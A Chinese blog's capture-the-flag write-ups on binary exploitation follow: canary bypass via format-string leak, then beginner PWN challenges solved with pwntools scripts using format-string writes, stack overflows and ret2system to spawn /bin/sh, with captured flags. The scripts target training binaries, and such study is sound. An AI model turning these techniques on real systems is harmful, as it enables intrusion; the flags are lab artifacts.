          <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"this is out\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">printf</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span><span class="token operator">&</span>sign<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span>
<span class="token punctuation">}</span></code></pre>
<p>利用格式化字符串的第一步就是需要测出内存中存储的字符串相对于参数的偏移</p>
<figure class="image-box">
                <img src="https://s2.ax1x.com/2019/10/18/KeEsiV.png" alt="KeEsiV.png" title class>
                <p>KeEsiV.png</p>
            </figure>

<p>这里可以测出 在我本机的偏移是6 那么将程序载入IDA(或者动态调试 都能达到相同的目的) 可以通过汇编面板看到 Var_c就是Canary值 那么转到主函数的栈图 可以明确看到 输入的参数距离Var_c的距离是 <strong>70-c=0x64</strong> 那么输入的参数距离Canary的参数个数就为 <strong>100(0x64)/4+6=31</strong> 明确我们利用格式化子串的格式化输入为 <strong>%31$p</strong></p>
<figure class="image-box">
                <img src="http://p1.so.qhimgs1.com/t0121dda714c5a6d361.jpg" alt title class>
                <p></p>
            </figure>

<figure class="image-box">
                <img src="http://p1.so.qhimgs1.com/t01e714c15cedb1cee0.jpg" alt title class>
                <p></p>
            </figure>

<p>那下一步就是写脚本了</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span>

sh<span class="token operator">=</span>process<span class="token punctuation">(</span><span class="token string">"./canary"</span><span class="token punctuation">)</span>
sys_addr<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">"./canary"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'pwn'</span><span class="token punctuation">]</span>
payload <span class="token operator">=</span> <span class="token string">"%31$p"</span>
sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"this is out\n"</span><span class="token punctuation">)</span>
canary<span class="token operator">=</span>sh<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>
canary<span class="token operator">=</span>int<span class="token punctuation">(</span>canary<span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'0'</span><span class="token punctuation">)</span>
payload2<span class="token operator">=</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x64</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>canary<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>sys_addr<span class="token punctuation">)</span>
<span class="token comment" spellcheck="true">#这个脚本这里是有问题的 菜鸡实在不知道怎么把十进制数转成16进制数... 大致思路理解下即可...</span>
sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"this is out\n"</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
<h3 id="溢出覆盖绕过Canary保护"><a href="#溢出覆盖绕过Canary保护" class="headerlink" title="溢出覆盖绕过Canary保护"></a>溢出覆盖绕过Canary保护</h3><p>先给出样例</p>
<pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string"><stdio.h></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string"><stdlib.h></span></span>

<span class="token keyword">void</span> <span class="token function">pwn</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
      <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
      <span class="token keyword">int</span> sign<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>
      <span class="token keyword">char</span> a<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
      <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token operator">!</span>sign<span class="token punctuation">)</span>
      <span class="token punctuation">{</span>
            <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>a<span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"this is out\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">printf</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span><span class="token operator">&</span>sign<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span>
<span class="token punctuation">}</span></code></pre>
<p>这个就没有那么多将就 直接载入IDA 看距离 覆盖到Canary值即可</p>
<p>脚本如下</p>
<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding:utf-8</span>
<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>
context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'deepin-terminal'</span><span class="token punctuation">,</span> <span class="token string">'-x'</span><span class="token punctuation">,</span> <span class="token string">'sh'</span> <span class="token punctuation">,</span><span class="token string">'-c'</span><span class="token punctuation">]</span>
r <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./canary1"</span><span class="token punctuation">)</span>
shell_addr <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./canary1"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">"pwn"</span><span class="token punctuation">]</span>
payload <span class="token operator">=</span> <span class="token string">"a"</span><span class="token operator">*</span><span class="token number">100</span>
r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"this is out"</span><span class="token punctuation">)</span>
r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">100</span><span class="token punctuation">)</span>
canary <span class="token operator">=</span> u32<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x0a</span>
log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"canary:"</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>canary<span class="token punctuation">)</span><span class="token punctuation">)</span>
r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'0'</span><span class="token punctuation">)</span>
payload <span class="token operator">=</span>  <span class="token string">"a"</span><span class="token operator">*</span><span class="token number">100</span> <span class="token comment" spellcheck="true">#填充</span>
payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>canary<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#泄露的canary</span>
payload <span class="token operator">+=</span> <span class="token string">"a"</span><span class="token operator">*</span><span class="token number">8</span>
payload <span class="token operator">+=</span> <span class="token string">"aaaa"</span> <span class="token comment" spellcheck="true">#ebp</span>
payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>shell_addr<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># ret addr</span>
r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>
r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
<script>
        document.querySelectorAll('.github-emoji')
          .forEach(el => {
            if (!el.dataset.src) { return; }
            const img = document.createElement('img');
            img.style = 'display:none !important;';
            img.src = el.dataset.src;
            img.addEventListener('error', () => {
              img.remove();
              el.style.color = 'inherit';
              el.style.backgroundImage = 'none';
              el.style.background = 'none';
            });
            img.addEventListener('load', () => {
              img.remove();
            });
            document.body.appendChild(img);
          });
      </script></body></html>]]></content>
      
        <categories>
            
            <category> PWN </category>
            
        </categories>
        
        
        <tags>
            
            <tag> PWN </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[攻防世界PWN新手练习区WP]]></title>
      <url>/2019/10/08/gong-fang-shi-jie-pwn-xin-shou-lian-xi-qu-wp/</url>
      <content type="html"><![CDATA[<html><head></head><body><a id="more"></a>
<blockquote>
<p>近期笨逼菜鸡开始接触PWN 刷了刷攻防世界的题目 在这里记录下自己的学习成果</p>
</blockquote>
<h2 id="CGfsb"><a href="#CGfsb" class="headerlink" title="CGfsb"></a>CGfsb</h2><p>首先是PWN题的常规起手式 查壳查保护 捎带着看下程序信息<br>发现无壳 但是存在Canary保护和NX保护</p>
<figure class="image-box">
                <img src="https://img-blog.csdnimg.cn/20190928183818798.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDU0MDI4Ng==,size_16,color_FFFFFF,t_70" alt title class>
                <p></p>
            </figure>

<blockquote>
<p>这里先讲一下什么是Canary保护<br>Canary保护主要是用来防护栈溢出的 在开启Canary保护程序调用函数的时候 会在栈中压入一个随机Canary值 在函数结束的时候程序会判断Canary值是否发生变动 如果发生变动就认为是程序遭到了攻击 程序直接异常退出 Canary值通常和函数返回地址在栈中相连 主要是防护攻击者更改程序返回地址来执行shellcode<br>这里我们直接拿本题做例子</p>
<figure class="image-box">
                <img src="https://img-blog.csdnimg.cn/20190928185413790.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDU0MDI4Ng==,size_16,color_FFFFFF,t_70" alt title class>
                <p></p>
            </figure>可以明确看到程序现在在存储Canary值 我们在数据下硬件读写断点 然后让程序跑起来
<figure class="image-box">
                <img src="https://img-blog.csdnimg.cn/20190928185721986.png" alt title class>
                <p></p>
            </figure>这里在函数末尾取出Canary值 如果与刚开始的值不一致 执行stack_chk_fail函数 
<p>对于如何绕过Canary保护 基本思路是利用各种漏洞 先泄漏出来Canary的地址 然后取出值 等溢出过后再还原 当然具体如何利用还得就题论题</p>
</blockquote>
<blockquote>
<p>同时也讲一下NX保护吧 NX保护一般是不可绕过的 他是禁止了栈执行 也就是即使你写入了shellcode 但是如果NX保护开启的话 也是不能在栈上执行的</p>
</blockquote>
<p>回到本题 先随便执行下 就是输入用户名和留言 然后程序原样打印出来</p>
<figure class="image-box">
                <img src="https://img-blog.csdnimg.cn/20190928190438694.png" alt title class>
                <p></p>
            </figure>
<p>没什么世纪大发现 那就常规操作 载入IDA吧</p>
<figure class="image-box">
                <img src="https://img-blog.csdnimg.cn/20190928190601948.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDU0MDI4Ng==,size_16,color_FFFFFF,t_70" alt title class>
                <p></p>
            </figure>
<p>发现程序存在格式化字符串漏洞 然后理解下程序逻辑 简单来说就是将pwnme变量的值更改为8就能拿到flag了 双击pwnme看一下 发现pwnme变量还是一个在bss段的全局变量 那基本思路已经有了</p>
<figure class="image-box">
                <img src="https://img-blog.csdnimg.cn/20190928190855410.png" alt title class>
                <p></p>
            </figure>
<p>解法基本就是通过格式化字符串漏洞更改pwnme的值了 那第一步就是测试程序的回显位了 这里我的回显位是在第十位</p>
<figure class="image-box">
                <img src="https://img-blog.csdnimg.cn/20190928191119916.png" alt title class>
                <p></p>
            </figure>
<p>那基本信息获取的差不多了 就可以开始编写脚本了</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
sh<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">"111.198.29.45"</span><span class="token punctuation">,</span><span class="token string">"48339"</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"please tell me your name:"</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"Dust"</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"leave your message please:"</span><span class="token punctuation">)</span>

payload<span class="token operator">=</span>p32<span class="token punctuation">(</span><span class="token number">0x0804A068</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'0000%10$n'</span>

sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
<p>执行脚本即可</p>
<figure class="image-box">
                <img src="https://img-blog.csdnimg.cn/20190928191836485.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDU0MDI4Ng==,size_16,color_FFFFFF,t_70" alt title class>
                <p></p>
            </figure>
<p>得到flag:cyberpeace{bb8c9af83fb8e8913ed25c1d5cc41751}</p>
<h2 id="when-did-you-born"><a href="#when-did-you-born" class="headerlink" title="when_did_you_born"></a>when_did_you_born</h2><p>照例 日常开局…</p>
<figure class="image-box">
                <img src="https://img-blog.csdnimg.cn/20190928193518639.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDU0MDI4Ng==,size_16,color_FFFFFF,t_70" alt title class>
                <p></p>
            </figure>
<p>跑一下 没啥思路 直接载入IDA吧</p>
<figure class="image-box">
                <img src="https://img-blog.csdnimg.cn/20190928193555812.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDU0MDI4Ng==,size_16,color_FFFFFF,t_70" alt title class>
                <p></p>
            </figure>
<p>简单理解下 就是程序要求变量v5的值最后为1926 而程序开始的输入不允许输入1926…初看是自相矛盾的..话说哪道Pwn题给的初始条件不是自相矛盾的… 在代码中发现gets函数..因为gets函数不会限制输入的字符个数 初步怀疑是栈溢出 双击v4查看程序栈图</p>
<figure class="image-box">
                <img src="https://img-blog.csdnimg.cn/20190928193834619.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDU0MDI4Ng==,size_16,color_FFFFFF,t_70" alt title class>
                <p></p>
            </figure>
<p>没跑了 栈溢出 直接开始写脚本吧</p>
<blockquote>
<p>这里解释下为什么程序开启了Canary保护依然可以使用栈溢出漏洞 这是因为Canary保护主要是防护函数的返回地址不被篡改的 从这里程序的栈图就能看出 Canary值的变量名就是var_8 如果我们切换到汇编窗口 就能看到最后的校验使用的就是这个var_8变量</p>
<figure class="image-box">
                <img src="https://img-blog.csdnimg.cn/20190928194120774.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDU0MDI4Ng==,size_16,color_FFFFFF,t_70" alt title class>
                <p></p>
            </figure>
</blockquote>
<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
sh<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">"111.198.29.45"</span><span class="token punctuation">,</span><span class="token string">"45209"</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"What's Your Birth?"</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"1925"</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"What's Your Name?"</span><span class="token punctuation">)</span>

payload<span class="token operator">=</span><span class="token string">"A"</span><span class="token operator">*</span><span class="token number">0x8</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">1926</span><span class="token punctuation">)</span>

sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
<p>执行即可 </p>
<figure class="image-box">
                <img src="https://img-blog.csdnimg.cn/20190928205109233.png" alt title class>
                <p></p>
            </figure>
<p>得到flag:cyberpeace{5f65371d87fafa327d2c0d3e254cfab5}</p>
<h2 id="hello-pwn"><a href="#hello-pwn" class="headerlink" title="hello_pwn"></a>hello_pwn</h2><p>正常起手式 查保护</p>
<figure class="image-box">
                <img src="https://ae01.alicdn.com/kf/H03408bfb2a394554a5da866c4afb5f6d2.png" alt title class>
                <p></p>
            </figure>

<p>就开着NX保护 载入IDA看下</p>
<figure class="image-box">
                <img src="https://ae01.alicdn.com/kf/Haafee49ea83e4c7daceca7c1ff7ba19eh.png" alt title class>
                <p></p>
            </figure>

<p>简单理解下逻辑 就是判断一个程序中没有涉及到的变量 然后判断他的值 这明显就是在暗示是溢出 双击 dword_60106C看一下位置 发现是在bss段的全局变量 </p>
<figure class="image-box">
                <img src="https://ae01.alicdn.com/kf/Ha6fea8becfaf4d178c61ad6ebe4b3e12A.png" alt title class>
                <p></p>
            </figure>

<p>同时发现 程序主体中读入的变量和dword_60106C 仅相差4个字节的位置 而程序主体读入的大小是10个字节 确定此处存在溢出 直接编写脚本即可</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
a<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">"111.198.29.45"</span><span class="token punctuation">,</span><span class="token string">"33618"</span><span class="token punctuation">)</span>
a<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token string">"~~ welcome to ctf ~~"</span><span class="token punctuation">)</span>
a<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token string">"lets get helloworld for bof"</span><span class="token punctuation">)</span>
payload<span class="token operator">=</span><span class="token number">4</span><span class="token operator">*</span><span class="token string">'A'</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0x6E756161</span><span class="token punctuation">)</span>
a<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
a<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
<p>运行脚本获得结果</p>
<figure class="image-box">
                <img src="https://ae01.alicdn.com/kf/He5cc965499c84899b125e4cf23ba4067T.png" alt title class>
                <p></p>
            </figure>

<p>得到flag:cyberpeace{57c7b3fd167ec0630431800825423de0}</p>
<h2 id="level0"><a href="#level0" class="headerlink" title="level0"></a>level0</h2><p>老样子 先查保护 发现除了NX全关 尝试着运行下程序 连个回显都没有 啥都看不出来 载入IDA</p>
<figure class="image-box">
                <img src="https://ae01.alicdn.com/kf/H517f8a13e257412d9d6384d16df45a62Q.png" alt title class>
                <p></p>
            </figure>

<p>发现主函数空空如也 有点头疼</p>
<figure class="image-box">
                <img src="https://ae01.alicdn.com/kf/H3c2accf3c7744312b8eca1af4a1a8544u.png" alt title class>
                <p></p>
            </figure>

<p>但是发现在函数表中 有个敏感函数<em>callsystem</em></p>
<figure class="image-box">
                <img src="https://ae01.alicdn.com/kf/H7e89a7b80e54402bb3bdbe3df90d89b71.png" alt title class>
                <p></p>
            </figure>

<p>菜鸡此时就有点思路了 应该是劫持返回地址 然后让程序执行到callsystem函数 那么继续在主函数跟下去</p>
<figure class="image-box">
                <img src="https://ae01.alicdn.com/kf/H2fafe4eb2bf444938173a2e4900c9fc7U.png" alt title class>
                <p></p>
            </figure>

<p>这个read就很明显了 read了200个字节..双击buf看下栈图<br>这里截不下图就不截了..简单算一下 80+8=88个字节 而程序读入100个字节 那就是溢出了…同时这里程序的地址随机化是关着的…不多说..开始写脚本吧..</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
sh<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">"111.198.29.45"</span><span class="token punctuation">,</span><span class="token string">"35202"</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token string">"Hello, World"</span><span class="token punctuation">)</span>
payload<span class="token operator">=</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x88</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x400596</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
<p>运行脚本得到结果 注意 因为程序是执行了 <em>/bin/sh</em>也就是打开了个终端 需要我们自己去执行获得flag..别说了..刚开始菜鸡等了半天..</p>
<figure class="image-box">
                <img src="https://ae01.alicdn.com/kf/Ha764f1cb5400434a968e2aaf0cdbf41cw.png" alt title class>
                <p></p>
            </figure>

<p>得到flag:cyberpeace{c07387d32eabb849023878563a5400ef}</p>
<h2 id="level-2"><a href="#level-2" class="headerlink" title="level 2"></a>level 2</h2><p>习惯性起手式</p>
<figure class="image-box">
                <img src="https://ae01.alicdn.com/kf/Hc6b5266b6cb14cf395076de26d6e009ci.png" alt title class>
                <p></p>
            </figure>

<p>一样没有开地址随机化 直接载入IDA </p>
<p><img src="https://ae01.alicdn.com/kf/Hce1df255f000422f9bb805cb6d16c2b7V.png" alt></p>
<figure class="image-box">
                <img src="https://ae01.alicdn.com/kf/H4584d6b417144896b3663437a7cb38aeI.png" alt title class>
                <p></p>
            </figure>

<p>本来没啥头绪 后来发现函数表中有敏感函数<em>system</em> 那大致思路形成 就是和上题差不多 但是我们在覆盖返回地址的同时 直接把栈修改成正常调用system(“/bin/sh”)的样子 同时发现在程序内存中也存有 <em>/bin/sh</em> 那开始写脚本吧</p>
<figure class="image-box">
                <img src="https://ae01.alicdn.com/kf/Hf1c2df51b87d40cca5c3cea1ef3b77e42.png" alt title class>
                <p></p>
            </figure>

<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>
elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./level_2'</span><span class="token punctuation">)</span>
sysadr<span class="token operator">=</span>elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>
shadr<span class="token operator">=</span>elf<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">'/bin/sh'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>next<span class="token punctuation">(</span><span class="token punctuation">)</span>
sh<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">"111.198.29.45"</span><span class="token punctuation">,</span><span class="token string">"58030"</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token string">"Input:"</span><span class="token punctuation">)</span>
payload<span class="token operator">=</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x8c</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>sysadr<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>shadr<span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
<blockquote>
<p>这里解释下payload吧 因为在函数调用时除去保存现场外 先入栈的就是返回地址 这里的 <em>p32(0)</em> 就是充当返回地址用的 当然因为此处我们直接打开了终端 根本就不需要程序返回 所以随便写就好了 然后就是参数入栈 具体是从左向右 还是从右向左是调用协议规定的 这需要具体程序具体分析 </p>
</blockquote>
<p>执行脚本得到结果</p>
<figure class="image-box">
                <img src="https://ae01.alicdn.com/kf/Hafe199f5112746a8a6d3ec0c1ac63bf1o.png" alt title class>
                <p></p>
            </figure>

<p>flag:cyberpeace{984f929f5fdae818c75ee89278e36753}</p>
<h2 id="string"><a href="#string" class="headerlink" title="string"></a>string</h2><p>基本起手式 查保护 发现除了地址随机化 其他保护全开</p>
<figure class="image-box">
                <img src="https://ae01.alicdn.com/kf/H4d812ba85367425c97e4366c35709200q.png" alt title class>
                <p></p>
            </figure>

<p>先尝试着跑了一遍 发现有点像一个古董级别的RPG游戏…没啥思路</p>
<p>那就不多说了 直接载入IDA吧</p>
<figure class="image-box">
                <img src="https://ae01.alicdn.com/kf/H0b9af83d49574ea0bb152aec87e3395f4.png" alt title class>
                <p></p>
            </figure>

<p>主函数没啥看的 主要就是泄漏了一个数组的地址 继续向sub_400D72步入</p>
<figure class="image-box">
                <img src="https://ae01.alicdn.com/kf/Hd7e0574cc9624bec9e0b0d536347cf0dR.png" alt title class>
                <p></p>
            </figure>

<p>这里就是常见角色了 稍微步入看下 发现sub_400A7D函数 就是仅仅是在输出和限制我们的选择 如果想继续玩下去就得输入east 没什么好分析的 步入sub_400BB9进行分析 </p>
<p><img src="https://ae01.alicdn.com/kf/H5d2aa44863bc44a2957223dfad87090aJ.png" alt></p>
<p>哦吼 看了这么久终于看见一个漏洞 先记录下来 在sub_400BB9中存在格式化字符串漏洞 但是就代码阅读到这里 还是没什么利用思路 继续向下看 终于在sub_400CA6发现关键判断</p>
<figure class="image-box">
                <img src="https://ae01.alicdn.com/kf/H0d55785e0dad447a9633290b4ad3f6c7w.png" alt title class>
                <p></p>
            </figure>

<p>通过慢慢查找 发现在函数中比对的 a1和a1[1] 其实就是主函数刚开始泄漏地址的数组 菜鸡这里当时卡了很久…真的不知道if内是在干啥..后来通过大佬指点 看到将指针v1强制转换为函数类型..简单来说就是执行函数</p>
<p>看到这里那基本思路形成了 首先是需要我们通过格式化字符串漏洞 将刚开始的数组值修改为一样的 然后写入shellcode 最后利用if内语句执行即可 那么首先需要先写脚本看下主机处的回显位</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

sh<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">"111.198.29.45"</span><span class="token punctuation">,</span><span class="token string">"48825"</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"name be:"</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"AAAA"</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"So, where you will go?east or up?:"</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"east"</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"or leave(0)?:"</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"'Give me an address'"</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"1234"</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"And, you wish is:"</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"AAAA.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x"</span><span class="token punctuation">)</span>
